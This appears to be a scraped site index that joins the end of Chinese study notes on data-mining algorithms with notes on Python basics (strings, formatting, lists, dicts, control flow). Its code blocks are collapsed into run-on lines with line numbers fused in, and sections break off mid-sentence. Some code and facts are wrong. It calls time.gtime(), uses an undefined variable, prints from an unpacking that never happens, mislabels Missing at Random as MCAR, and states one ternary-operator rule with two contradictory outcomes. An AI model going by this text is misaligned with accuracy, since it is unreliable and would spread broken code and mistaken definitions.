min’)$$当多个属性的数值分布区间相差较大时，使用最小——最大规范化可以将这些属性值变换到同一个区间，这对于属性间的比较以及计算对象之间的距离很重要 注意：最小——最大规范化只是对原始数据进行了线性变换，对原始数据经过平移以及缩放操作，方差和均值均会改变，但数据分布形态（直方图）不变。 独热编码 独热编码(One Hot Encoding)又称一位有效编码，用来对标称属性（分类属性）进行编码 独热编码构成的向量较为稀疏。在实际应用中，多采用CSR等压缩形式存储稀疏矩阵。 注意：独热编码的引入有时候会带来数据属性(维数)极大扩张的负面影响 1.4.2 数据抽样技术 不放回简单随机抽样 步骤： 根据待抽样数据的概率，计算以数组形式表示的累计分布概率cdf，并规范化 根据还需要抽样的个数，生成[0, 1]的随机数数组x 将x中的随机数按照cdf值升序找到插入位置，形成索引数组new 找出new中不重复的索引位置，作为本次抽样的位置索引。 在概率数组p中，将已经抽样的索引位置置0 重复上述步骤，直到输出指定数目的样本。 水库抽样 给定一个数据流或者大小未知的数据集合，从中随机抽取k个样本，并使得在数据集合中每个元素被抽中的概率相等 1234567891011Init : a reservoir with the size： k for i= k+1 to N M=random(1, i); if( M &lt; k) SWAP the Mth value and ith value end for 1.4.3 主成分分析主成分分析 Principal Component Analysis 即PCA 是用较少数量的、彼此不相关的综合维度(主成分)来代替原来的维度 如果前m个主成分累计的方差已经占到总体方差的85%以上，那么就可以选择前m个uk(k=1,…,m)作为最终的主成分 可以通过计算原始数据与主成分得分之间的相关性系数，来分析原属性与各个主成分之间的关系 步骤： 将样本数据表示成列向量形式 将X每一行（维）进行零均值化 求样本协方差阵$C=\\frac{1}{n-1}XX^T$ 计算C的特征值$\\lambda_1\\ge\\lambda_2\\ge,…,\\ge\\lambda_p\\ge0$ 计算$F=(UX)^T$ 1.4.4 数据清洗 缺失值填充(Filling in Missing Values) 数据集中不含缺失值的变量(属性)称为完全变量，数据集中含有缺失值的变量(属性)称为不完全变量 数据缺失机制： 完全随机缺失(Missing Completely at Random, MCAR)：数据的缺失与不完全变量以及完全变量都是无关的 随机缺失(Missing at Random, MCAR)：数据的缺失依赖于完全变量，数据缺失与缺失的数据值无关，但与数据在某些属性上的取值有关 非随机缺失(Not Missing at Random, NMAR)在不完全变量中数据的缺失依赖于不完全变量的本身，这种缺失是不可忽略的。 填充缺失值方法 均值填充法 局部均值填充 回归填充法 热卡填充法 平滑噪声 Smoothing Noisy Data 分箱： 等深分箱法 等宽分箱法 最小熵法 用户自定义区间法 局部平滑法： 平均值平滑 边界值平滑 中值平滑 1.5 Spark数据预处理功能简介二、关联规则挖掘2.1 基本概念 根据频繁项集的元素个数k，将频繁项集称为频繁k-项集 支持度计数 设集合T中事务的总数为N，则项集X的支持度定义为： $$sup(X) = \\frac{\\sigma(X)}{N}$$ 最小支持度(minsup) 频繁项集(频繁模式) 关联规则 支持度 关联规则的支持度与项集支持度相同 置信度$$con(A-&gt;B)=\\frac{\\sigma(AUB)}{\\sigma(A)}$$在包含面包的事务中，有75%的人还同时购买了牛奶和奶酪 最小置信度 强关联规则(Strong Association Rule)同时满足最小支持度和最小置信度 过程：首先，通过最小支持度，找到所有的频繁项集；然后，根据最小置信度，过滤频繁项集产生的所有关联规则；最后得到用户可能感兴趣的强关联规则 2.2 基于候选项产生-测试策略的频繁模式挖掘算法2.2.1 Apriori算法 先验原理(Apriori Property)：如果一个项集是频繁的，则它的所有子集一定也是频繁的。 2.2.2 基于划分的算法改进了Apriori算法的性能 将整个事务数据库T的所有记录划分成不相交的子数据库(Partition)：pi。保证每个pi大小合适，能够放到内存的缓冲区中，从而提高访问效率，减少磁盘I/O开销 把每个pi单独扫一遍，得到局部(Locally)的频繁项集。局部频繁项集X的支持度计数需要满足：$\\sigma_i(X)\\ge N_i\\times minsup$ Ni和minsup分别是子数据库Pi的记录数和全局最小支持度阈值 将所有局部频繁项集合并，再扫描一次所有的子数据库，即第二次扫描整体数据库T，从而得到全局频繁项集 2.2.3 事务数据的存储 二元表示存储 垂直数据格式 不足：如果项集的数目很大，比较短的候选项集的数目就会很多，导致tidlist的存储和访问开销增大 2.3 不需要产生候选集的频繁模式挖掘算法FP-Growth算法2.4 结合相关性分析的关联规则支持度——置信度框架 不足：两种商品间存在负面影响时不适用 增加相关性能度量指标 提升度(Lift) 度量名称(Kulczynski) Kulc 度量名称：不平衡因子(Imbalance Ratio ,IR) 2.5 多层关联规则挖掘算法三、分类与回归算法3.1 决策树算法决策树算法是以实例为基础的归纳学习算法，通常用来形成分类器和预测模型，它可以对未知数据进行分类或预测、数据预处理和数据挖掘等。它通常包括两部分：树的生成和树的剪枝 3.1.1 决策树简介决策树类似于流程图的树结构。经过一批训练集的训练产生一棵决策树，决策树上的每个内部节点表示在一个属性上的测试，内部节点的属性称为测试属性。每个分枝则代表一个测试的输出，每个树叶节点代表类（分类标签），即所要学习划分的类。 3.1.2 决策树的类型 分类树：离散变量 回归树：连续变量 不同属性： 决策树内节点的测试属性可以是单变量的，即每个内节点只包含一个属性；也可能是多变量的，例如，多个属性的线性组合，即存在包含多个属性的内节点 每个内节点分支的数量取决于测试属性值的个数。如果每个内节点只有两个分支则称之为二叉决策树 分类结果既可能是两类又可能是多类，如果二叉决策树的结果只能有两类则称之为布尔决策树 3.1.3 决策树的构造过程属性的选择策略就是根据不同的标准来做出选择，而选择的依据则与不确定性有关。 3.1.4 信息论的相关概念 自信息量 信息熵 条件熵 平均互信息量 3.1.5 ID3算法123456输入：训练数据集D输出：决策树T1.如果D中元组的分类属性唯一，返回；2.计算所有非分类属性的信息增益，选择最大的属性A， 为A属性构造中间节点；3.按照属性A的不同取值，对D进行划分，并构造节点A的 分支以及子节点；4.在每个子节点上递归执行ID3算法。 3.1.6 信息论在ID3算法中的应用决策树学习过程就是使得决策树对数据集划分的不确定程度逐渐减小的过程。 3.1.7 C4.5算法C4.5算法继承了ID3算法的所有优点，并对ID3算法进行了改进和补充。C4.5采用信息增益率作为选择分支属性的标准，克服了ID3算法中信息增益偏向选择取值多属性的不足，并能够完成对连续属性离散化的处理 3.1.8 CART算法Classification And Regression Tree 能够处理连续和离散值类型的属性，递归地构造一棵二叉树 https://blog.csdn.net/e15273/article/details/79648502 https://zhuanlan.zhihu.com/p/32003259 3.1.9 过拟合与决策树剪枝预剪枝(Pre-Pruning)常见的预剪枝方法： 定义一个高度，当决策树的高度达到此值时，停止决策树的生长 定义一个阈值，当到达某节点的训练样本个数小于该值时，停止决策树的生长 定义一个阈值，如果当前的分支对系统性能的增益小于该值时，停止决策树的生长 到达某节点的实例具有相同的特征向量，即使实例不属于同一类也停止决策树生长。该方法对于数据冲突问题比较有效。 问题： 很难精确地估计何时停止决策树的生长 预剪枝存在视野效果问题，当前的扩展可能会造成过度拟合训练数据，但更进一步的扩展能够满足要求，也可能准确地拟合训练数据，这将会使得算法过早停止决策树的构造。 后剪枝(Post-Pruning)首先，构造完整的决策树，允许过度拟合训练数据；然后对那些置信度不够的节点子树用叶节点代替。该叶子的类标号设为子树根节点所对应的子集中占数最多的类别。 常见的后剪枝方法： REP(Reduced Error Pruning)——错误率降低剪枝 PEP(Pessimistic Error Pruning)——悲观错误剪枝 CCP(Cost Complexity Pruning)——代价复杂度剪枝 EBP(Error Based Pruning)——基于错误的剪枝 3.2 贝叶斯分类器3.3 基于实例的分类算法3.3.1 KNN分类器KNN K-Nearest Neighbor 过程： 计算距离：给定测试实例，计算出测试实例与训练集中每个样本的距离 寻找近邻：找出与测试实例距离最小的前K个训练样本作为测试实例的K-近邻 确定类别：将K个最近邻的主要归属类别作为测试实例的确定类别 当训练样本集不平衡时，此时占数多的类别更占优势。所以较大的K值能够减少噪声的影响，但会使类别之间的界限变得模糊；但K值过小时，便是取最近的样本点，这样的学习缺少了泛化能力，同时很容易受噪声数据和异常值的影响 K值过大易造成欠拟合，K值过小易造成过拟合 常见的确定K值的方法： 取训练集中样本总数的平方根 根据验证集，通过交叉验证确定K值 KNN算法的实现： 枚举法： 基于索引树结构实现 KD树 K指k维空间 https://zhuanlan.zhihu.com/p/53826008 3.3.2 局部加权回归局部加权回归 Locally Weighted Regression 是一种非参数学习方法，主要思想就是只对预测样本附近的一些样本进行选择，根据这些样本得到的回归方程比较拟合样本数据 步骤： 对于输入x，利用权重高低选择x的邻域训练样本 根据邻域的训练样本求取参数$\\theta$，使其均方差最小 利用参数$\\theta$，得到输入x对应的预测值$\\theta ^Tx$ 对于新输入，重复上述过程 局部加权回归算法的优点： 只需提供平滑参数和局部多项式的阶数便可构造模型，适合没有理论模型基础的复杂建模过程 对训练数据拟合效果较好 对特征的选择依赖程度较小 缺点： 数据的使用效率较低，需要规模较大，采样密集的数据集才能生成好的模型 计算量较大，每次预测都需要扫描所有的数据并重新计算参数 容易出现过拟合现象 3.3.3 基于案例的推理Case Based Reasoning CBR 正则性 典型性 经验性 易适应性 AR模型： Retrieve：案例检索，从案例库中检索到与当前事件最为相似的案例 Reuse：案例重用，检索到的解决方案经重用作为新事 件的建议解决方案 Revise：案例修订，解决方法经测试、评估和修订后得到当前事件最终解决方案 Retain：案例存储，最终解决方案可能与事件一起作为新的案例保存到案例库中，以便使系统具有自增量的学习能力 案例 = 问题的描述 + 相应的解决方案 + 方案的实施效果 3.4 组合分类算法组合分类方法： 个体学习器间不存在强依赖关系，可同时生成的并行化方法：Bagging、随机森林(Random Forest) 个体学习器间存在强依赖关系，必须串行生成的序列化方法:AdaBoost 3.4.1 AdaBoost算法具体流程： 初始化训练数据的权值分布，每个数据所占权重相同，设共有N个训练数据样本，则各个数据所分配权重为1/N 基于当前数据权重分布生成分类器，得出分类器的分类误差率$e$，并选取分类误差率最低的分类器作为新的分类器 利用该分类器的分类误差率$e$计算此分类器在投票决策中所占权重$\\alpha$ 根据该分类器的分类情况调整训练数据的权值分布$\\omega$ 重复步骤2，3直到当前集成学习器的预测误差为0或达到分类器规定的阈值 3.4.2 Bagging算法Bagging是与Boosting思想相对的集成算法。 通过T次采样，对应得到T个采样集 基于每个采样集独立训练出T个弱学习器 通过集合策略将弱学习器集成和升级到强学习器 自主采样法 Bootstraping 平均每个弱学习器只使用了原数据集中63.2%的样本 Bagging与Boosting各自特点 Boosting注重对真实结果的逼近拟合，侧重偏差。降低偏差的方法是不断地修正预测结果与真实值间的距离。Bagging还注重在多个数据集/多种环境下的训练，侧重方差。降低方差的方法就是利用相互交叉的训练集让每个学习器都得到充分的训练 Bagging的训练速度较Boosting更快，其性能依赖于基分类器的稳定性。如果基分类器不稳定，那么Bagging有助于降低训练数据的随机波动导致的误差；如果基分类器稳定，那么集成分类器的误差主要由基分类器的偏倚引起。由于每个弱分类器只使用了原始分类器63.2%的样本，所以Bagging可以适用剩下36.8%的样本作为验证集来对泛化能力进行估计 3.4.3 随机森林3.5 分类器算法的评估 混淆矩阵(Confusion Matrix) 评价指标： 准确率(Accuracy) 精准率(Precision) 召回率(Recall) F1分数(F1-score) ROC曲线与AUC ROC(Receiver Operating Characteristic) 接受者操作特征 AUC(Area Under the Curve) ROC曲线的面积 灵敏度 特异度 3.6 回归分析3.6.1 线性回归评价回归模型的指标： 平均绝对误差(Mean Absolute Error, MAE) 均方误差(Mean Squared Error, MSE) 中值绝对误差(Median Absolute Error, MedAE) 可释方差得分(Explained Variance Score, EVS) $R^2$决定系数(拟合优度, $R^2Score$) 3.6.2 岭回归岭回归是一种改良的最小二乘估计法，通过放弃最小二乘法的无偏性，以损失部分信息、降低精度为代价获得回归系数，它是更为符合实际、更可靠的回归方法，对存在离群点的数据的拟合要强于最小二乘法 3.6.3 多项式回归可以从图像的散点图观察： 存在一个“弯”，考虑用二次多项式 存在两个“弯”，考虑用三次多项式 存在三个“弯”，考虑用四次多项式 依次类推 3.6.4 逻辑回归3.6.5 决策树回归四、聚类算法 聚类：无监督学习 分类：有监督学习 4.2 聚类算法的分类 基于划分的聚类算法 基于层次的聚类算法 基于密度的聚类算法 基于模型的聚类算法 基于网格的聚类算法 4.3 距离度量4.3.1 幂距离Power Distance 4.3.2 欧式距离Euclidean Distance 4.3.3 曼哈顿距离Manhattan Distance 城市街区距离(City Block Distance) 4.3.4 切比雪夫距离Chebyshev Distance 4.3.5 余弦相似度Cosine Similarity 余弦相似度用向量空间中两个向量夹角的余弦值衡量两个个体间差异的大小。相比距离度量，余弦相似度更加注重两个向量在方向上的差异，而非距离或长度。空间中两个对象的属性所构成的向量之间的夹角大小，当方向完全相同，完全相似，相似度为1；当方向完全相反时，完全不相似，相似度为-1.余弦相似度对数值不敏感，侧重于方向上的差异。 4.3.6 兰氏距离Canberra Distance 4.3.7 马氏距离Mahalanobis Distance 4.3.8 斜交空间距离Oblique Space Distance 4.3.9 杰卡德距离Jaccard Distance 4.4 基于划分的聚类算法4.4.1 K均值算法K均值(K-Means)算法的基本思想是，首先随机选取k个点作为初始聚类中心，然后计算各个对象到所有聚类中心的距离，把对象归到离它最近的那个聚类中心所在的类。计算新的聚类中心，如果相邻两次的聚类中心没有任何变化，说明对象调整结束，聚类准则函数已经收敛，至此算法结束 不足： 在K均值算法中k是预先给定的，k值难以估计 常采用误差平方和准则函数作为聚类准则函数，如果各类之间区别明显且数据分布稠密，比较有效。但如果各类的形状和大小差别很大，为使误差平方和最小有可能出现将大的聚类分割的情况。可能会陷入局部最优解 数据量大时，时间开销大 4.4.2 二分K均值聚类算法4.4.3 小批量K均值算法Mini Batch 小批量不使用所有的数据样本，而是从不同聚类的样本中抽取一部分样本来代表各自聚类进行计算，由于计算样本量少，所以会减少运行时间，也必然会带来准确度的下降 4.4.4 K均值++算法核心思想：在选择一个新的聚类中心时，距离已有聚类中心越远的点，被选取作为聚类中心的概率越大 4.4.5 K中心算法K-Medoids算法选用簇中位置最靠近中心的对象，即中心点作为簇的参照点 4.4.6 数据流K均值算法spark 4.5 基于密度的聚类算法","link":"/2021/09/25/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/"},{"title":"python编程","text":"变量和简单类型单行注释和多行注释 通常而言，合理的代码注释应该占源代码的1/3左右 变量弱类型语言两个典型特征 变量无需声明即可直接赋值：对于一个不存在的变量赋值就相当于定义了一个新变量 变量的数据类型可以动态的改变：同一个变量可以一会被赋值整数值，一会为字符串 使用print函数输出变量1print(value, ..., sep=' ', end='\\n', file=sys.stdout, flush=False) value 可以输出多个变量 sep=’|’ end=’ ‘ file ```pythonf = open(“hello.txt”, “w”)print(“hello,world!”, file=f)f.close()1234567891011121314+ flush参数用于控制输出缓存，一般保持为False，以获得较好的性能### 变量的命名规则+ 标识符可以由字母、数字、下划线(_)组成，其中数字不能打头+ 标识符不能为python关键字，但可以包含关键字+ 标识符不能包含空格### python 的关键字和内置函数```pythonimport keywordkeyword.kwlist 1dir(__builtins__) 数值类型整型整型数值的四种表示形式 十进制 二进制：0b或0B开头 八进制：0o或0O开头 十六进制：0x或0X开头 为了提高数值（包括浮点型）的可读性，python3允许使用_对数值进行分隔 123one_million = 1_000_000print(one_million)price = 234_234_234 # price实际的值为234234234 浮点型表示形式： 十进制形式 科学计数形式 5.12e2 5.12E2 –&gt; 5.12x102 注：只有浮点型数值才可以用科学计数形式表示。51200为整型，512E2为浮点型 复数复数的虚部用j或J表示 1import cmath 字符串字符串和转义字符123str = '&quot;hello,my girlfriend.Let's have dinner&quot;, he said.' # ×str = '&quot;hello,my girlfriend.Let\\'s have dinner&quot;, he said.' # √# 观察颜色 拼接字符串 两个字符串写在一起，自动拼接 12str = &quot;hello,&quot; &quot;girlfriend&quot;print(str) +号拼接 1234str1 = &quot;hello,&quot;str2 = &quot;girlfriend&quot;str3 = str1 + str2print(str3) repr和字符串当需要将字符串与数值进行拼接时，可以使用str()和repr()函数 12345s = &quot;这本书的价格是：&quot;price = 118print(s + p) # 报错print(s + str(p))print(s + repr(p)) 其中str是python内置的函数，repr则是函数，此外repr还可以以python表达式的形式来表示值 12345str = &quot;hello, my girlfriend&quot;print(str)print(repr(str))&gt;&gt;&gt; hello, my girlfriend&gt;&gt;&gt; 'hello, my girlfriend' 带引号的字符串——字符串的python的表达式形式 交互式解释器中，python会自动使用repr 使用input和raw_input获得用户输入input函数总是返回一个字符串 长字符串1234str = '''hello,mygirlfriendlet's have dinner''' 123str = &quot; \\hello,mygirlfriend \\let's have dinner&quot; 12num = 20 + 3 / 4 + \\ 2 * 3 原始字符串原始字符串以r开头，且不会把\\当成特殊字符 1234&gt;&gt;&gt; print('&quot;let\\'s go&quot;, she said')&quot;let's go&quot;, she said&gt;&gt;&gt; print(r'&quot;let\\'s go&quot;, she said')&quot;let\\'s go&quot;, she said 原始字符串的结尾不能为\\ 需要的话可以使用字符串拼接方法 字节串（bytes）字符串转换成bytes对象 字符串内容都为ASCII字符，可直接在字符串之前加ｂ 调用bytes()函数，如果不指定字符集，默认为utf-8 调用字符串本身的encode()方法 1234567891011121314151617181920212223242526272829&gt;&gt;&gt; b1 = bytes()&gt;&gt;&gt; b1b''&gt;&gt;&gt; b2 = b''&gt;&gt;&gt; b2b''&gt;&gt;&gt; b3 = b'helloworld'&gt;&gt;&gt; b3b'helloworld'&gt;&gt;&gt; b3[0]104&gt;&gt;&gt; b3[2:4]b'll&gt;&gt;&gt; b4 = b'你好世界'SyntaxError: bytes can only contain ASCII literal characters.&gt;&gt;&gt; b5 = bytes(&quot;helloworld&quot;, encoding = 'utf-8')&gt;&gt;&gt; b5b'helloworld'&gt;&gt;&gt; print(b5)b'helloworld'&gt;&gt;&gt; b6 = bytes(&quot;你好世界&quot;, encoding = 'utf-8')&gt;&gt;&gt; b6b'\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd\\xe4\\xb8\\x96\\xe7\\x95\\x8c' &gt;&gt;&gt; b7 = &quot;你好世界&quot;.encode('utf-8')&gt;&gt;&gt; b7b'\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd\\xe4\\xb8\\x96\\xe7\\x95\\x8c'&gt;&gt;&gt; st = b7.decode('utf-8')&gt;&gt;&gt; st'你好世界' 深入理解字符串转义字符 转义字符 说明 \\b 退格符 \\n 换行符 \\r 回车符 \\t 制表符 \\“ 双引号 \\‘ 单引号 \\\\ 反斜线 字符串格式化python提供了“%”对各种类型的数据进行格式化输出 12price = 118print(&quot;this book costs %s yuan&quot; % price) 123name = &quot;zhangsan&quot;price = 118print(&quot;%s 's book cost %s yuan&quot; % (name, price)) 转换说明符 说明 d, i 带符号十进制整数 o 带符号八进制整数 x 带符号十六进制整数 X 带符号十六进制整数 e 科学计数法的浮点数e E 科学计数法的浮点数E f, F 十进制的浮点数 g 智能选择f或e G 智能选择F或E C 转换为单字符 r repr()转换为字符串 s str()转换为字符串 12345678910111213num = 118print(&quot;num is %6i&quot; % num)print(&quot;num is %6d&quot; % num)print(&quot;num is %6o&quot; % num)print(&quot;num is %6x&quot; % num)print(&quot;num is %6X&quot; % num)print(&quot;num is %6s&quot; % num)&gt;&gt;&gt; num is 118&gt;&gt;&gt; num is 118&gt;&gt;&gt; num is 166&gt;&gt;&gt; num is 76&gt;&gt;&gt; num is 76&gt;&gt;&gt; num is 118 此时指定了字符串的最小宽度为6，默认情况下，转换出来的字符串总是右对齐的，在python中是可以改变的 -：指定左对齐 +：表示数值总要带着符号（正数带+，负数带-） 0：表示不补充空格，补充0 注：这三个标志可以同时存在 对于浮点数，python允许指定小数点后的数字位数 对于字符串，python允许指定转换后的字符串的最大字符数 123name = &quot;zhangsan&quot;print(&quot;kuangtu is %10.5s &quot; % name)&gt;&gt;&gt; kuangtu is zhang 序列相关方法12345s[3:-5]s[5:]s[-6:]s[:5]s[:-6] 12345s = 'helloworld'print('hello' in s)len()max()min() 大小写相关方法12&gt;&gt;&gt; dir(str)&gt;&gt;&gt; help(str.title) s.title() 首字母大写 s.upper() 每个字母大写 s.lower() 每个字母小写 删除空白strip v 脱衣服; 除去，剥去; 拆卸; 剥夺; strip() 方法用于移除字符串头尾指定的字符（默认为空格）。 strip()：删除字符串前后的空白 lstrip()：删除字符串前面（左边）的空白 rstrip()：删除字符串后面（右边）的空白 1234567&gt;&gt;&gt; help(str.strip)Help on method_descriptor:strip(self, chars=None, /) Return a copy of the string with leading and trailing whitespace removed. If chars is given and not None, remove characters in chars instead. python中str不可变，故返回副本而不是原字符串的改变 注意：该方法只能删除开头或是结尾的字符，不能删除中间部分的字符。 12345str = &quot;*****this is **string** example....wow!!!*****&quot;print (str.strip( '*' )) # 指定字符串 *&gt;&gt;&gt; this is **string** example....wow!!!str = &quot;123abcrunoob321&quot;print (str.strip( '12' )) # 字符序列为 12 查找、替换相关方法 startwith()：判断字符串是否以指定子串开头 endswith()：判断字符串是否以指定子串结尾 find()：查找指定子串在字符串中出现的位置，若没找到，返回-1 index()：查找指定子串在字符串中出现的位置，若没找到，引发ValueError错误 replace()：使用指定子串替换字符串中的目标子串 translate()：使用指定的翻译映射表对字符串替换 12345678910111213141516print(s.replace('hello', 'hi', 1))intab= &quot;aeiou&quot;outtab= &quot;12345&quot;deltab= &quot;thw&quot; trantab1= str.maketrans(intab,outtab)# 创建字符映射转换表trantab2= str.maketrans(intab,outtab,deltab)#创建字符映射转换表，并删除指定字符 test= &quot;this is string example....wow!!!&quot; print(test.translate(trantab1))print(test.translate(trantab2))&gt;&gt;&gt; th3s3s str3ng2x1mpl2....w4w!!!&gt;&gt;&gt; 3s 3s sr3ng2x1mpl2....4!!! 分割、连接方法 split()：将字符串按指定分隔符分割成多个短语 join()：将多个短语连接成字符串 123456789str = &quot;Line1-abcdef \\nLine2-abc \\nLine4-abcd&quot;;print str.split( ); # 以空格为分隔符，包含 \\nprint str.split(' ', 1 ); # 以空格为分隔符，分隔成两个['Line1-abcdef', 'Line2-abc', 'Line4-abcd']['Line1-abcdef', '\\nLine2-abc \\nLine4-abcd']message = 'https://mp.csdn.net/'print(message.split(&quot;//&quot;)[1].split(&quot;/&quot;)[0].split(&quot;.&quot;))打印结果：['mp', 'csdn', 'net'] 1234567891011121314s1 = &quot;-&quot;s2 = &quot;&quot;seq = (&quot;r&quot;, &quot;u&quot;, &quot;n&quot;, &quot;o&quot;, &quot;o&quot;, &quot;b&quot;) # 字符串序列print (s1.join( seq ))print (s2.join( seq ))r-u-n-o-o-brunoob&gt;&gt;&gt;li = ['my','name','is','bob'] &gt;&gt;&gt;' '.join(li) 'my name is bob' &gt;&gt;&gt;'_'.join(li) 'my_name_is_bob' 运算符赋值运算符算数运算符位运算符 &amp;：按位与 |：按位或 ^：按位异或 ~：按位取反 &lt;&lt;：左位移运算符 ‘&gt;&gt;：右位移运算符 扩展后的赋值运算符索引运算符[] [2:8:3] 比较运算符与bool类型 is：判断两个变量使用的对象是否相同 is not：判断两个变量使用的对象是否不相同，不相同返回Tru 12345import timea = time.gtime()b = time.gtime()print(a == b) # Trueprint(a is b) # False 每次调用gtime()函数都返回不同的对象 123id(a)id(b)# 判断变量所引用对象的内存地址，计算机同一块内存在任一时刻只能存放一个对象 逻辑运算符三目运算符1True_statements if expression else False_statements python允许在三目运算符的True_statements或False_statements中放置多条语句 多条语句以英文逗号隔开：每条都会执行，返回所有返回值构成的元组 多条语句以英文逗号隔开：每条都会执行，返回第一条语句的返回值 in运算符 in not in in运算符可以判断字符串是否包含特定的子串，和序列是否包含子序列 运算符的结合性和优先级列表、元组和字典序列简介python的序列…… 创建列表和元组…… 列表和元组的通用用法通过索引使用元素…… 子序列slice [start: end: step] 加法 列表只能和列表相加 元组只能和元组相加 元组不能直接和列表相加 乘法意义：列表或元组包含的元素重复N次 123456&gt;&gt;&gt; l = (&quot;ll&quot;)&gt;&gt;&gt; type(l)&lt;class 'str'&gt;&gt;&gt;&gt; l = (&quot;ll&quot;,)&gt;&gt;&gt; type(l)&lt;class 'tuple'&gt; in运算符…… 长度、最大值和最小值一次比较每个字符的ASCII码值 序列封包和序列解包 程序将多个值赋给一个变量时，python会自动将多个值封装成元组，此为封包 程序允许将序列（元组列表等）直接赋值给多个变量，此时序列中的各元素会被依次赋值给每个变量（要求个数相等），此为解包 1234567# 封包vals = 10, 20, 30# 解包a_tuple = tuple(range(1, 10, 2))a, b, c, d, e = a_tuplea_list = ['xsad', 'dsvsvf']a_str, b_str = a_list 12345x, y, z = 10, 20, 30# 执行过程如下：xyz = 10, 20, 30x, y, z = xyz 1x, y, z = y, z, x 程序的解包时可以只解出部分变量，剩下的依然使用列表变量保存 12345678910111213# first、second保存前两个元素，rest列表包含剩下的元素first, second, *rest = range(10)print(first) # 0print(second) # 1print(rest) # [2, 3, 4, 5, 6, 7, 8, 9]# last保存最后一个元素，begin保存前面剩下的begin, *last = range(10)print(begin) # [0, 1, 2, 3, 4, 5, 6, 7, 8]print(last) # 9# first保存第一个元素，last保存最后一个，middle保存中间剩下的print(first) # 0print(middle) # [0, 1, 2, 3, 4, 5, 6, 7, 8]print(last) # 9 使用列表创建列表list()函数 tuple()函数 增加列表元素 append()函数，会形成列表中嵌套列表，嵌套元组的情形 extent()函数，追加列表中的元素而不是将列表当做一个元素 insert()函数，指定位置插入元素 删除列表元素 del语句，可以删除列表元素及变量 根据索引 可以删除列表中单个元素，也可以删除列表的中间一段 ```pythondel a_list[1: 3] # 不包含del a_list[1: -1: 2] # 不包含，间隔为2 12345+ remove()函数，根据元素的本身，只删除第一个，找不到抛出ValueError - ```python c_list.remove('csdsv') clear()方法，清空列表中所有元素 ```pythonc_list.clear()12345678910111213141516171819### 修改列表元素+ 修改元素法增加、删除元素```pythonb_list = list(range(1, 5))print(b_list)# 将第2个到第4个（不包含）元素赋值为新列表的元素b_list[1: 3] = ['a', 'b']print(b_list) # [1, 'a', 'b', 4]# 将第3个到第3个（不包含）元素赋值为新列表的元素，就是插入元素b_list[2:2] = ['x', 'y']print(b_list) # [1, 'a', 'x', 'y', 'b', 4]# 将第3个到第6个（不包含）元素赋值为空列表，就是删除元素b_list[2: 5] = []print(b_list) # [1, 'a', 4] 使用slice语法赋值时，不能使用单个值，使用字符串赋值python会自动把字符串当成序列处理，其中每一个字符都是一个元素 slice语法赋值时，如果使用step参数，则元素个数要保持一致 列表中其他常用方法 count()：用于统计列表中某个元素出现的次数 index()：用于判断某个元素在列表中出现的位置 pop()：用于将列表当做“栈”使用，实现元素出栈功能 reverse()：用于将列表中的元素反向存放 sort()：用于对列表元素排序 使用字典创建字典元组可做key，列表不能，key要求为不可变的 使用dict()函数创建字典时，可以传入多个列表或元组参数作为key-value对 1234vegetables = [('celery', 1.58), ('brocoil', 1.29), ('lettuce', 2.19)]dict3 = dict(vegetables)cars = [['BWM', 8.5], ['bens', 8.3], ['AUDI', 7.9]]dict4 = dict(cars) 1dict5 = dict(spinach = 1.39, cabbage = 2.59) 字典的基本用法 通过key访问value 通过key添加key-value对 通过key删除key-value对 通过key修改key-value对 通过key判断指定key-value对是否存在 字典的常用方法 clear()：清空字典中所有key-value对 get()：根据key获取value，若不存在，直接访问报错，get方法None update()：存在覆盖，不存在更新 items()：获取字典中所有的key-value对 keys()：获取字典中所有的key values()：获取字典中所有的value 1234567891011&gt;&gt;&gt; cars = [['BWM', 8.5], ['bens', 8.3], ['AUDI', 7.9]]&gt;&gt;&gt; carss = dict(cars)&gt;&gt;&gt; itms = carss.items()&gt;&gt;&gt; print(itms)dict_items([('BWM', 8.5), ('bens', 8.3), ('AUDI', 7.9)])&gt;&gt;&gt; print(list(itms))[('BWM', 8.5), ('bens', 8.3), ('AUDI', 7.9)]&gt;&gt;&gt; print(list(carss.keys()))['BWM', 'bens', 'AUDI']&gt;&gt;&gt; print(list(carss.values()))[8.5, 8.3, 7.9] pop()：用于获取指定key对应的value并删去此key-value popitem()：随机弹出字典中的一个key-value（总是弹出底层存储的最后一个key-value）弹出格式为元组，可使用序列解包分别接受 1k, v = cars.popitem() setdefault()：default 默认的 根据key获取value，存在则直接返回，不存在则读取默认 fromkeys()：使用给定的多个key创建字典，value默认为None，也可以指定 使用字典格式化字符串1234# 在字符串模板中使用keytemp = '书名是：%(name)s，价格是%(price)010.2f，出版社是：%(publish)s'book = {'name':'疯狂python', 'price':118, 'publish':'地摊'}print(temp % book) 流程控制顺序结构…… if分支结构使用if else分支语句时，一定要先处理包含范围更小的情形 pass语句…… 断言断言语句与if分支有些类似，它用于对一个bool表达式进行断言，如果该表达式为True，该程序可以继续向下执行；否则抛出AssertionError异常。 1234s_age = input(&quot;请输入您的年龄：&quot;)age = int(s_age)assert 20 &lt; age &lt; 80print(&quot;输入的年龄在20和80之间&quot;) assert断言的逻辑： 12if 条件为False： 程序引发AssertionError异常 循环结构while循环…… while循环遍历…… for-in循环…… for-in循环遍历…… for-in循环遍历字典字典包含三种方法： items() keys() values() for-in循环遍历字典正是基于这三种方法读取的列表进行遍历 123456for key, value in my_dict.items(): passfor key in my_dict.keys(): print(my_dict[key])for value in my_dict.values(): pass 循环使用elsepython的循环都可以定义else代码块，当循环条件为False时，程序会执行else代码块 123456count_i = 0while count_i &lt; 5: print('count_i小于5：', count_i) count_i += 1else: print('count_i大于或等于5：', count_i) 这里else相当于print 12345count_i = 0while count_i &lt; 5: print('count_i小于5：', count_i) count_i += 1print('count_i大于或等于5：', count_i) 循环的else是为了使python代码更优雅 在for循环中，else可以读取循环计数器的最后一个值 12345a_list = [330, 54, 5.68, -56.2, 'dksoji', 'dsjk']for ele in a_list: print('元素：', ele)else: print('else块值：', ele) 嵌套循环…… for表达式 列表推导式 ```pythona_range = range(10)b_list = [x * x for x in a_range if x % 2 == 0]print(b_list)1234567891011+ 生成器推导式 - ```python a_range = range(10) c_generator = (x * x for x in a_range if x % 2 == 0) for i in c_generator: print(i, end='\\t') &gt;&gt;&gt; c_generator &lt;generator object &lt;genexpr&gt; at 0x00000231A888A6D0&gt; 多循环列表推导式 ```pythone_list = [(x, y, z) for x in range(5) for y in range(4) for z in 